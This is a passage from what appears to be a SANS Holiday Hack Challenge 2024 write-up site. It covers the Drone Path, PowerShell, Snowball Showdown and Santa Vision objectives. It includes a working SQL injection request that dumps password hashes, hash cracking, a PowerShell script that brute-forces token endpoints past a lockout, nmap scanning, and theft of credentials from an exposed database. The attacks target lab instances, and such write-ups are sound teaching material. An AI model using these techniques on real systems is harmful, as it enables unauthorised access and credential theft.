\"NGHLzu1ru/4ERNJxZoE1/QEiguEYLItKtr0WsmwcMfhswLv9Tec+ZRjR\", \"MWna2645xKopUtpxaJ89olVd1dYTJISsz5CtbxJFXJPiMCte0noG\", \"I2TNwuN386wjHZFbdYYj/RBi0Z9XA49IuLW1OoUxRdZ+wmfnJvvtJwXi10k=\", \"L2na0+M1t5IvQtN2ad9w3hp81sYQIIYOpc2XzyjeMgAWf7nbp/ts\", \"L2HL0uN8+/Jmfd53Y5w+olVbzNoDJI4ElLWuMIkGP9LTeVuwVKu4l7DOB1U91N0=\", \"J2XB1vs1t5ozU91wad9wxwdrztIZJQMfNE4DYwx1R7bg5c50NDQ=\", \"Jmne0+Y1t40/Vd98ft9wzwB91sEWLYNFu2xWVc39+4i1Bn7JWwoynA==\", \"J2XF26451qslWt14aZd8rjtr1ZMtJItIvrKk5S9JSEZ8qKvgRP2Mvcy4eQ==\", \"Ln3Bya452rs+WNJ2J7A5+gwigv4SOYNHsHi4IVfVImdVO9OdwBX0/mw=\", \"IWnc0udr/rAjHZFWc4cx+RQigvAWL4tAvg5ALUCnxBG/cw3LfEmj4oA=\", \"NmfFeSNqu/4LXt9tYoU56hBhjpMiM59Dqr253YTDn38uXKJ5tl00FEINTg==\", \"I2bG26451LE2VN9xZpQ14Fku5tYZLItWtJEJuhXmygDg52L+RBvqJyA=\", \"Mm3c3/A1t5E1Xd41J70//AJv27+zexRjk1E0oOdUtHEChqA=\", \"KH3E0+M1t5wjQ91wad9wyRB8z9IZOJNUHr+RrQebnoaStFwY+6Y=\", \"MWnFz+d1u/4QWNR3aZJ8rjR70ccFKItX81FQp//+9EtF+nURL4FI\", \"LGHG264527QzU91zZp0xolVdztwBJIRNvlt7/VakIoRl++rXlHttwhE=\", \"I2bMyOdwu/4FWdhqbp0x+1ku79wbJYVSvr7qGO5Zb23L3xCvXHMRYvs=\", \"KWnBlqJR8rI1WN9ybt9wyBxgztIZJUkQdjl75fDWiRSzBI1CHdw=\", \"I2DF3+Y1t50nWMN2K9MV6Qx+1mbIOp5nPzrOusVi9a3n/50=\", \"O2nb1+t38vJmctBqZpE87xttw59XDIVWsL+jOGYAZSakGQcwH9LkY0MNP74=\", \"Lm3H1K45zb8hQ9R7K9MT/Bpv1toWCeg3YKGO+eApkQGBF09JMw==\", \"K3vJ2Od1+79qEeN2apZ8rjx6w98OKXRQNvvj/tYXj2mFoDhaZw==\", \"JG3E0/o1t5MzX9h6b99wyRB8z9IZOEuf/8PQJ7tJYwF2ZBYDZDY=\", \"MWfO0+M1t58yWdR3dN9wyQdrx9AS/R916miej6pBB+UB54ZZ1g==\", \"L2nc3+01t5wzVN92dNMR5wdr0Z9XAJhDurK0PoMIwB3/YInPpneEf/Q3blsrDg==\", \"LWTBzOt4u/4RVN11bp03+hpgjpM5JJ0EhbmhO4wHNjmjzqwzDO366z8XlmAxBAo=\", \"JmnG0+d1u/4MXtl4aZ01/Rd70NRbYblLqqiod6wPIKlWAvC4AsA71TXm3aAJve9HIUA=\", \"LGfa2645278hXsI1J7056RB8y9LIAUNdOdmXkW3fRpcNUxV8\", \"MXzN3ON3u/4EVN1+dZI061ku8dYFI4NF6DAFvK8r77cS9dUOpitQRg==\", \"Lm3B1uM1t58qVth8dYB8rjRixdYFKItGdCiZJowXSEk2P7+XCerx\", \"KWHFlqJK8rEzXZ05VJwl+h0u6dwFJIuDD8ONR42MoY7KFht/QJfy\", \"Ln3L0+M1t5wnQ9J8a5w+71ku8cMWKIQC0zxiXHG/YZvw7T+TNIqz\", \"LWXJyK4507EuUJ05VpIk7wcjUnL2xhkJz8n9Dm47dXGt\", \"L2na0+c1t5IzSdR0ZZwl/BIigv8COY9JvbO1JYqohuoT5OQ0dvvUWILo1jaO\", \"NmfFlqJV+K1mcN9+Yp81/Vku9+A2aAwUTns96j8eMWk7TUtSxw==\", \"J2zf2/B95PJmf9RuJ7k1/AZr259XFLll5xvRfxu/YDOTFR460RwK+Q==\"};\n        for (int i = 0; i &lt; names.length; i++){\n            String res = decryptData(names[i]);\n            System.out.println(res);\n        }\n  }\n}\n</code></pre> <p>We can then rebuild the APK using Visual Studio Code's APK Labs extension, and then run those names on the emulator in Android Studio. After manually comparing the names again, we find one missing:</p> <p>Joshua</p> <p>from Birmingham, United Kingdom</p>"},{"location":"objectives/act_2/o6_mobile/#response","title":"Response","text":"<p>Eve Snowshoes</p> <p>Aha! Success! You found it!</p> <p>Thanks for staying on your toes and helping me out\u2014every step forward keeps Alabaster\u2019s plans on track. You're a real lifesaver!</p>"},{"location":"objectives/act_2/o7_drone/","title":"Drone Path","text":"<p>Official Difficulty: </p> <p>My Difficulty Rating: </p>"},{"location":"objectives/act_2/o7_drone/#objective","title":"Objective","text":"<p>Request</p> <p>Help the elf defecting from Team Wombley get invaluable, top secret intel to Team Alabaster. Find Chimney Scissorsticks, who is hiding inside the DMZ.</p> Chimney Scissorsticks <p>Hey. Psst, over here. Hey, I'm Chimney Scissorsticks.</p> <p>I'm not liking all the tension brewing between the factions, so even though I agreed with how Wombley was handling things, I get the feeling this is going to end poorly for everyone. So I'm trying to get this data to Alabaster's side. Can you help?</p> <p>Wombley's planning something BIG in that toy factory. He's not really making toys in there. He's building an armada of drones!</p> <p>They're packed with valuable data from the elves working on the project. I think they hide the admin password in the drone flight logs. We need to crack this to prevent this escalating snowball showdown.</p> <p>You'll be working with KML files, tracking drone flight paths. Intriguing, right? We need every detail to prepare for what\u2019s ahead!</p> <p>Use tools like Google Earth and some Python scripting to decode the hidden passwords and codewords locked in those files.</p> <p>Ready to give it a go? It\u2019s going to be a wild ride, and your skills might just turn the tide of this conflict!</p>"},{"location":"objectives/act_2/o7_drone/#solution","title":"Solution","text":""},{"location":"objectives/act_2/o7_drone/#silver","title":"Silver","text":"<p>To begin, we can navigate to the FileShare and download the path. Importing it into Google Earth gives us the first password we need:</p> <p></p> <p>We can now login with the username: fritjolf and password: GUMDROP1</p> <p>As fritjolf, we now have access to an Elf Drone Workshop page where we can search for drones. Naturally, I immediately tried an SQL injection:</p> <p></p> <p>Playing around with <code>ORDER BY</code> to work out the number of columns we'd need to match in a subquery will cause different drones to be returned. Eventually, we stumble upon ELF-HAWK with the comments:</p> <p>Quote</p> <ul> <li> <p>These drones will work great to find Alabasters snowball warehouses. I have hid the activation code in the dataset ELF-HAWK-dump.csv. We need to keep it safe, for now it's under /files/secret.</p> </li> <li> <p>We need to make sure we have enough of these drones ready for the upcoming operation. Well done on hiding the activation code in the dataset. If anyone finds it, it will take them a LONG time or forever to carve the data out, preferably the LATTER.</p> </li> </ul> <p>Not the intended path</p> <p>This isn't how silver is intended to be solved, just how I solved it. The proper way to solve it is to view fritjolf's profile.</p> <p></p> <p>The file downloaded there has lattitude and longitude values that can be imported into Google Earth. After importing, you must zoom way in, in order to see the terrain shows the value \"Elf-Hawk\". You can then search for the drone directly without using any SQLi.</p> <p>Open the ELF-HAWK-dump.csv in Google Sheets and plot it in a line chart with the longitude as the X-axis and the latitude as the y-axis:</p> <p></p> <p>DroneDataAnalystExpertMedal</p>"},{"location":"objectives/act_2/o7_drone/#gold","title":"Gold","text":"<p>From the silver challenge, we discovered an SQL injection in the drone search. We can exploit this to dump the database's usernames and passwords by sending a request like:</p> <pre><code>GET /api/v1.0/drones?drone='+UNION+SELECT+username,password,'1'+FROM+users-- HTTP/2\nHost: hhc24-dronepath.holidayhackchallenge.com\nCookie: _ga=GA1.1.291187586.1702175657; _ga_F6ZZNPR5E5=GS1.1.1702189151.3.1.1702190561.0.0.0; GCLB=\"38db899faa8ef55c\"; session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZnJpdGpvbGYifQ.Z1jfGg.EWTwW_fQCixBDQrPTcQJ457CZpw\nReferer: https://hhc24-dronepath.holidayhackchallenge.com/workshop\n</code></pre> <p>with the response: <pre><code>{\"name\":\"brynne\",\"quantity\":\"2fd03c8ea542a7fd85ca4ebbcc13d5ca\",\"weapons\":\"1\"},{\"name\":\"filo\",\"quantity\":\"3c3a4f722ec77c1712941003443a4d83\",\"weapons\":\"1\"},{\"name\":\"fritjolf\",\"quantity\":\"2bb7ab7713cc012f02eb03c95f6e4443\",\"weapons\":\"1\"},{\"name\":\"lira\",\"quantity\":\"9eb6c13b1b18bc785ffb84d977bf5499\",\"weapons\":\"1\"},{\"name\":\"pip\",\"quantity\":\"e54efff9e6258bef3eb35f093e3bae00\",\"weapons\":\"1\"},{\"name\":\"sprigg\",\"quantity\":\"4f7f1b7c49fa2b0cc22e2d2599f1f2e5\",\"weapons\":\"1\"},{\"name\":\"tylwen\",\"quantity\":\"b9af6f935826ae1a89ecba72476fbcba\",\"weapons\":\"1\"}\n</code></pre></p> <p>Those hashes look like MD5 which means we can try to crack them with free online rainbow tables or with something like JackTheRipper.</p> <p>Pip's password cracks to <code>RumbleInTheJungle</code>, but logging in gives us nothing much beyond their profile:</p> <p>Quote</p> <p>Bio: Pip is a master of drone delivery, programming routes with such precision that packages arrive exactly on the second they are expected. He has a large collection of flags, impressive!</p> <p>What is a hint and what is not?</p> <p>I got very stuck here. <code>Pip</code> could refer to the Package Installer for Python. The comments for Pigeon-Lookalike-v4 say:</p> <p>\"I heard a rumor that there is something fishing with some of the files.  There was some talk about only TRUE carvers would find secrets and that FALSE ones would never find it.\"</p> <p>That led me down a rabbithole reading about https://autocarver.readthedocs.io/en/latest/carvers_examples.html. I believe Pip and carver are both misdirects though.</p> <p>\"Flags\", \"TRUE\" and \"FALSE\" suggests they might be hiding values in the \"True\" and \"False\" columns so we can write a small Python script to convert them to binary:</p> <pre><code>lines = None\nwith open(\"ELF-HAWK-dump.csv\", \"r\") as fd:\n      lines = fd.readlines()\n\n\nfor line in lines:\n   for cell in line.split(\",\"):\n       if cell == \"TRUE\":\n               print(\"1\", end=\"\")\n       elif cell == \"FALSE\":\n               print(\"0\", end=\"\")\n</code></pre> <p>We can use Cyberchef to convert the binary into ASCII:</p> <p></p> <p>EXPERTTURKEYCARVERMEDAL</p> <p>CODEWORD=EXPERTTURKEYCARVERMEDAL</p>"},{"location":"objectives/act_2/o7_drone/#response","title":"Response","text":"<p>Chimney Scissorsticks</p> <p>Bravo! You've tackled the drone challenge and navigated through those KML files like a true expert. Your skills are just what we need to prevent the big snowball battle\u2014the North Pole thanks you!</p> <p>Well done! You cracked the code from the drones and showed you've mastered the basics of KML files. This kind of expertise will be invaluable as we gear up for what\u2019s ahead!</p> <p>But I need you to dig deeper. Make sure you\u2019re checking those file structures carefully, and remember\u2014rumor has it there is some injection flaw that might just give you the upper hand. Keep your eyes sharp!</p>"},{"location":"objectives/act_2/o8_powershell/","title":"PowerShell","text":"<p>Difficulty: </p>"},{"location":"objectives/act_2/o8_powershell/#objective","title":"Objective","text":"<p>Request</p> <p>Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.</p> Piney Sappington <p>Hey there, friend! Piney Sappington here.</p> <p>You've probably heard the latest\u2014things are getting tense around here with all the faction business between Wombley and Alabaster. But, let\u2019s focus on this PowerShell Terminal for now.</p> <p>This is the remote access for our snowball weaponry. We programmed some defense mechanisms to deter intruders, but the system is in a faulty lockdown state.</p> <p>I certainly wasn't the one that programmed the mechanism. Nope not me. But can you help me find a way through it so I can regain access?</p> <p>There's two functions I need access to. The snow cannon terminal, which should be easier. And the snow cannon production and deployment plans. That one's better defended.</p> <p>Still, I've got faith in you. We need every advantage we can get right now, and you might be just the one to tip the balance.</p> <p>So, think you can do it? Are you ready to show what you've got?</p>"},{"location":"objectives/act_2/o8_powershell/#hints","title":"Hints","text":"PowerShell Admin Access - Fakeout EDR Threshold <p>They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response \"EDR\". The whole system is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. He supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints!</p> PowerShell Admin Access - Total Control <p>I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to Get-FileHash -Algorithm SHA256.</p>"},{"location":"objectives/act_2/o8_powershell/#solution","title":"Solution","text":""},{"location":"objectives/act_2/o8_powershell/#silver","title":"Silver","text":"<p>Geez that sounds ominous, I'm sure we can get past the defense mechanisms. We should warm up our PowerShell skills. How many words are there in the file?</p> <p><code>Get-Content ./welcome.txt | Measure-Object -Word</code></p> <p>There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?</p> <p><code>netstat -l</code>  shows us the port is 1225</p> <p>You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?</p> <pre><code>Invoke-WebRequest http://localhost:1225\nInvoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).\n</code></pre> <p>It looks like defensive measures are in place, it is protected by basic authentication. Try authenticating with a standard admin username and password.</p> <p><code>Invoke-WebRequest http://localhost:1225 -Authentication Basic -Credential \"admin\" -AllowUnencryptedAuthentication</code> with admin as the password</p> <p>There are too many endpoints here. Use a loop to download the contents of each page. What page has 138 words? When you find it, communicate with the URL and print the contents to the terminal.</p> <pre><code>$password =  ConvertTo-SecureString \"admin\" -AsPlainText -Force  \n$credential = New-Object System.Management.Automation.PSCredential(\"admin\", $password)\n\nInvoke-WebRequest http://localhost:1225 -Authentication Basic -Credential \"admin\" -AllowUnencryptedAuthentication -Outvariable x\n\nforeach ($l in $x.links) {                               \n    Invoke-WebRequest $l.href -outvariable c -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication\n    if (($c.Content | Measure-Object -Word).Words -eq 138) {\n        Write-Output $l\n        return\n    }\n}\n</code></pre> <p>There seems to be a csv file in the comments of that page. That could be valuable, read the contents of that csv-file!</p> <p>In the previous script, we should change the Invoke-WebRequest line to:</p> <p><code>(Invoke-WebRequest $l.href -outvariable c -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication).Content</code></p> <p>Then we can just use <code>$c.Content</code></p> <p>MFA token scrambler<p>Yuletide cheer fills the air, A season of love, of care.  The world is bright, full of light, As we celebrate this special night. The tree is trimmed, the stockings hung,    Carols are sung, bells are rung.    Families gather, friends unite, In the glow of the fire\u2019s light.    The air is filled with joy and peace,   As worries and cares find release.  Yuletide cheer, a gift so dear, Brings warmth and love to all near. May we carry it in our hearts,  As the season ends, as it starts.   Yuletide cheer, a time to share,    The love, the joy, the care.    May it guide us through the year,   In every laugh, in every tear.  Yuletide cheer, a beacon bright,    Guides us through the winter night </p><p> Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv</p></p> <p>Finally, run: <code>(Invoke-WebRequest http://127.0.0.1:1225/token_overview.csv -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication).Content</code></p> <p>Luckily the defense mechanisms were faulty! There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!</p> <pre><code>$ (Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication).content\n    &lt;h1&gt;[!] ERROR: Missing Cookie 'token'&lt;/h1&gt;\n    (Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=\"token=5f8dd236f862f4507835b0e418907ffc\"}).content\n    &lt;h1&gt;Cookie 'mfa_code', use it at &lt;a href='1732912027.263781'&gt;/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C&lt;/a&gt;&lt;/h1&gt;\n</code></pre> <p>Sweet we got a MFA token! We might be able to get access to the system. Validate that token at the endpoint!</p> <pre><code>$ (Invoke-WebRequest http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=\"token=5f8dd236f862f4507835b0e418907ffc;mfa_token=1732912620.6999872\"}).Rawcontent\nHTTP/1.1 200 OK                                                                              \nServer: Werkzeug/3.0.6\nServer: Python/3.10.12\nDate: Fri, 29 Nov 2024 20:37:18 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\nContent-Length: 137\n\n&lt;h1&gt;[!] System currently in lock down&lt;/h1&gt;&lt;br&gt;&lt;h1&gt;[!] Failure, token has expired. [*] Default timeout set to 2s for security reasons&lt;/h1&gt;\n</code></pre> <p>Looks like we can't manually copy the MFA token. Instead we need to store the token and then use it immediately:</p> <pre><code>$mfa_token =(Invoke-WebRequest http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=\"token=5f8dd236f862f4507835b0e418907ffc\"}).Links[0].href            \n\n(Invoke-WebRequest http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=\"token=5f8dd236f862f4507835b0e418907ffc;mfa_token=$mfa_token\"}).Rawcontent\nHTTP/1.1 200 OK                                                                              \nServer: Werkzeug/3.0.6\nServer: Python/3.10.12\nDate: Fri, 29 Nov 2024 20:38:44 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\nContent-Length: 227\n\n&lt;h1&gt;[+] Success&lt;/h1&gt;&lt;br&gt;&lt;p&gt;Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==&lt;/p&gt;\n</code></pre> <p>That looks like base64! Decode it so we can get the final secret!</p> <pre><code>[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\"Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==\"))                                          \nCorrect Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction\n</code></pre> <p>SnowLeopard2ReadyForAction</p> <p>Piney Sappington</p> <p>Fantastic work! You've navigated PowerShell\u2019s tricky waters and retrieved the codeword\u2014just what we need in these uncertain times. You're proving yourself a real asset!</p> <p>I'll let you in on a little secret\u2014there\u2019s a way to bypass the usual path and write your own PowerShell script to complete the challenge. Think you're up for it? I know you are!</p>"},{"location":"objectives/act_2/o8_powershell/#gold","title":"Gold","text":"<p>With the redacted endpoints, we have the <code>file_MD5hash</code> but we're missing the <code>Sha256</code> of it. We can use the unredacted endpoint to check if we can recreate it:</p> <pre><code>PS /home/user&gt; echo 5f8dd236f862f4507835b0e418907ffc &gt; test.txt\nPS /home/user&gt; Get-FileHash -Algorithm SHA256 ./test.txt                                                                                                         \nAlgorithm       Hash                                                                Path\n---------       ----                                                                ----\nSHA256          4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C    /home/\u2026\n</code></pre> <p>Fantastic! That means we can use all of the unredacted endpoints.</p> <pre><code># Store the credentials so that we can keep a cookie jar and reuse them to beat the \"fakeout EDR threshold\"\n$password =  ConvertTo-SecureString \"admin\" -AsPlainText -Force \n$credential = New-Object System.Management.Automation.PSCredential(\"admin\", $password)\n$url = [System.Uri]\"http://127.0.0.1:1225\"\n\n$content=(Invoke-WebRequest http://127.0.0.1:1225/token_overview.csv -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -SessionVariable session).Content\n$lines = $content.split()\n$max = 99\n$start = 2\nfor ($i = $start; $i -lt $max; $i++){\n   $md5 = $lines[$i].split(',')[0]\n   echo $md5 &gt; test.txt\n   $hash = (Get-FileHash -Algorithm SHA256 ./test.txt).Hash\n        # Repeat each request to bypass the \"Fakeout EDR threshold\"\n       for ($j = 0; $j -lt 10; $j++){\n          $session.Cookies.Add($url, (New-Object System.Net.Cookie('token',$md5,\"/\")))\n           $mfa_response =(Invoke-WebRequest http://127.0.0.1:1225/tokens/$hash -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -WebSession $session)\n       $mfa_token=$mfa_response.Links[0].href\n       if ($mfa_token) {\n           $session.Cookies.Add($url, (New-Object System.Net.Cookie(\"mfa_token\",$mfa_token,\"/\")))\n           $response = (Invoke-WebRequest http://127.0.0.1:1225/mfa_validate/$hash -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -WebSession $session)\n           if (! ($response.Content.Contains(\"ERROR:\") || $response.Content.Contains(\"Setting cookie attempts\"))) {\n               $response\n               return\n           }\n       }\n   }\n}\n\n$response.Content\n</code></pre> <p>WombleysProductionLineShallPrevail</p> <pre><code>&lt;h1&gt;[+] Success, defense mechanisms deactivated.&lt;/h1&gt;&lt;br&gt;Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail&lt;/p&gt;\n</code></pre>"},{"location":"objectives/act_2/o8_powershell/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Incredible! You tackled the hard path and showed off some serious PowerShell expertise. This kind of skill is exactly what we need, especially with things heating up between the factions.</p> <p>Well done! you've demonstrated solid PowerShell skills and completed the challenge, giving us a bit of an edge. Your persistence and mastery are exactly what we need\u2014keep up the great work!</p>"},{"location":"objectives/act_2/o9_snowball/","title":"Snowball Showdown","text":"<p>Difficulty: </p>"},{"location":"objectives/act_2/o9_snowball/#objective","title":"Objective","text":"<p>Request</p> <p>Wombley has recruited many elves to his side for the great snowball fight we are about to wage. Please help us defeat him by hitting him with more snowballs than he does to us.</p> Dusty Giftwrap <p>Hi there! I'm Dusty Giftwrap, back from the battlefield! I'm mostly here for the snowball fights!</p> <p>But I also don't want Santa angry at us, you wouldn't like him when he's angry. His face becomes as red as his hat! So I guess I'm rooting for Alabaster.</p> <p>Alabaster Snowball seems to be having quite a pickle with Wombley Cube. We need your wizardry.</p> <p>Take down Wombley the usual way with a friend, or try a different strategy by tweaking client-side values for an extra edge.</p> <p>Alternatively, we've got a secret weapon - a giant snow bomb - but we can't remember where we put it or how to launch it.</p> <p>Adjust the right elements and victory for Alabaster can be secured with more subtlety. Intriguing, right?</p> <p>Raring to go? Terrific! Here's a real brain tickler. Navigator of chaos or maestro of subtlety, which will you be? Either way, remember our objective: bring victory to Alabaster.</p> <p>Confidence! Wit! We've got what it takes. Team up with a friend or find a way to go solo - no matter how, let's end this conflict and take down Wombley!</p>"},{"location":"objectives/act_2/o9_snowball/#solution","title":"Solution","text":"<p>In theory, there's a number of different ways to solve this challenge:</p> <ul> <li>You could just join a team with someone who's cheating and get bronze.</li> <li>You could use the ice arch image to protect Alabaster and then play fairly</li> <li>You could DoS Wombley and his team by having a script autosend snowballs from him in the wrong     direction so that the timeout stops him from sending real requests</li> <li>You could join Wombley's team, since he has more elves on his side.</li> </ul> <p>However, I'm a big Firefox fan, and trying any of those options in Firefox's devtools while running Snowball Showdown just caused my computer to hang, unfortunately. So I assume they'd all be doable with Chrome... but I can't handle the UI of Chrome's devtools and there's an even better solution anyway. We can summon Elf The Dwarf!</p> <p></p> <p>To achieve this, you just need to wait for the websocket to be connected and then run <code>this.moasb()</code> in the console to summon a weapon of mass destruction (The Mother of All SnowBalls).</p> <p></p>"},{"location":"objectives/act_2/o9_snowball/#response","title":"Response","text":"<p>Dusty Giftwrap</p> <p>Brilliant! You unravel the puzzle and launched the 'mother-of-all-snow-bombs' like a true mastermind. Wombley never saw it coming!</p> <p>Last year\u2019s snowball fight taught us not to rely on client-side controls alone. Now, a server tracks every player action - no more sneaky moves! Let's just hope Alabaster didn't leave any client-side tricks for Wombley to exploit.</p> <p>Excellent! With Wombley\u2019s forces defeated, they\u2019ll have no choice but to admit defeat and abandon their wild plans to hijack Christmas.</p>"},{"location":"objectives/act_3/o11_santa_vision/","title":"Santa Vision","text":"<p>Official Difficulty: </p> <p>My Difficulty Rating: </p>"},{"location":"objectives/act_3/o11_santa_vision/#objective","title":"Objective","text":"<p>Request</p> <p>Alabaster and Wombley have poisoned the Santa Vision feeds! Knock them out to restore everyone back to their regularly scheduled programming.</p> Ribb Bonbowford <p>Hi, Ribb Bonbowford here, ready to guide you through the SantaVision dilemma!</p> <p>The Santa Broadcast Network (SBN) has been hijacked by Wombley's goons\u2014they're using it to spread propaganda and recruit elves! And Alabaster joined in out of necessity. Quite the predicament, isn't it?</p> <p>To access this challenge, use this terminal to access your own instance of the SantaVision infrastructure.</p> <p>Once it's done baking, you'll see an IP address that you'll need to scan for listening services.</p> <p>Our target is the technology behind the SBN. We need make a key change to its configuration.</p> <p>We've got to remove their ability to use their admin privileges. This is a delicate maneuver\u2014are you ready?</p> <p>We need to change the application so that multiple administrators are not permitted. A misstep could cause major issues, so precision is key.</p> <p>Once that's done, positive, cooperative images will return to the broadcast. The holiday spirit must prevail!</p> <p>This means connecting to the network and pinpointing the right accounts. Don't worry, we'll get through this.</p> <p>Let's ensure the broadcast promotes unity among the elves. They deserve to see the season's spirit, don't you think?</p> <p>Remember, it's about cooperation and togetherness. Let's restore that and bring back the holiday cheer. Best of luck!</p> <p>The first step to unraveling this mess is gaining access to the SantaVision portal. You'll need the right credentials to slip through the front door\u2014what username will get you in?</p>"},{"location":"objectives/act_3/o11_santa_vision/#hints","title":"Hints","text":"Filesystem Analysis <p>jefferson is great for analyzing JFFS2 file systems.</p> Misplaced Credentials <p>See if any credentials you find allow you to subscribe to any MQTT feeds.</p> Database Pilfering <p>Consider checking any database files for credentials...</p> Like a Good Header on Your HTTP? <p>Be on the lookout for strange HTTP headers...</p> (my own) Silver is silver and Gold is gold <p>Don't try to use any of your gold answers for your silver challenges.</p>"},{"location":"objectives/act_3/o11_santa_vision/#solution","title":"Solution","text":"<p>Random</p> <p>The IP address and numbers in the answers are randomly generated, so cannot be copy-pasted if trying to reproduce this.</p>"},{"location":"objectives/act_3/o11_santa_vision/#a-what-username-logs-you-into-the-santavision-portal","title":"A: What username logs you into the SantaVision portal?","text":""},{"location":"objectives/act_3/o11_santa_vision/#silver","title":"Silver","text":"<p>To start this challenge, we're simply given a site to spin up an IP address. So the first step is to scan it to see what ports we can play with:</p> <p><pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -sV 35.232.192.126                                  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 01:15 EST\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 3.52 seconds\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -sV -Pn 35.232.192.126\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 01:15 EST\nStats: 0:02:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan\nService scan Timing: About 66.67% done; ETC: 01:19 (0:00:57 remaining)\nNmap scan report for 126.192.232.35.bc.googleusercontent.com (35.232.192.126)\nHost is up (0.25s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT    STATE SERVICE   VERSION\n22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\n8000/tcp open  http-alt gunicorn\n9001/tcp open  tor-orport?\n</code></pre> No UDP ports are open, and port 9001 was responding with an HTTP-like response but no content.</p> Dead ends <p>The SSH was a tempting target, but it requires public key authentication. I spent a while trying to figure out what 9001 was and wondered if it might be Mongodb due to the database hint, but couldn't make it work. I also tried running <code>dirb</code> against both ports to see if there were any interesting paths.</p> <p>Visiting port 8000 shows a simple login page, but in HTML source code we can find the first answer: <code>&lt;!-- mqtt: elfanon:elfanon --&gt;</code></p> <p>elfanon</p>"},{"location":"objectives/act_3/o11_santa_vision/#gold","title":"Gold","text":"<p>The page also mentions <code>sitestatus</code>, and given the MQTT hint, we can assume port 9000 is listening to MQTT and one of the topics is \"sitestatus\". After using the <code>elfanon</code> credentials to connect, a message leads us to the following download: http://35.238.155.22:8000/static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin</p> <p>After installing jefferson, we can extract the server code to see that a Flask app is running. In views.py, we find the following code: <pre><code>@accounts_bp.route(\"/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite\", methods=[\"GET\"])\ndef db():\n    return send_from_directory(\"static\", \"sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite\", as_attachment=True)\n</code></pre></p> <p>Fortunately, this is also running in prod:  http://35.238.155.22:8000/static/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite gives us the SQLite database. We can simply open it in SQLite viewer to see the username and password are both stored in plaintext.</p> <p>santaSiteAdmin</p> <p>With password S4n+4sr3411yC00Lp455wd</p>"},{"location":"objectives/act_3/o11_santa_vision/#b-once-logged-on-authenticate-further-without-using-wombleys-or-alabasters-accounts-to-see-the-northpolefeeds-on-the-monitors-what-username-worked-here","title":"B: Once logged on, authenticate further without using Wombley's or Alabaster's accounts to see the northpolefeeds on the monitors. What username worked 